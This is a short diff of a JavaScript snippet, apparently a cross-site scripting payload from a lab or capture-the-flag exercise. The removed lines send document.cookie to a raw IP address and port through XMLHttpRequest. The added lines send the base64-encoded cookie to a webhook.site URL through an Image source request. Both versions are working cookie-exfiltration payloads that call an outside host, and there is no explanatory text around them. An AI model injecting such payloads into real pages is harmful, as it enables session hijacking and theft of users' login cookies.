@@ -1,5 +1,2 @@
-var xhttp = new XMLHttpRequest();
-
-xhttp.open('GET', 'http://94.237.59.63:49993/?' + document.cookie, true);
-
-xhttp.send();
+x = new Image(); x.src = 'https://webhook.site/ccf3253e-b47b-4f44-81db-f3593bd5c40a?
+data='+btoa(document.cookie);
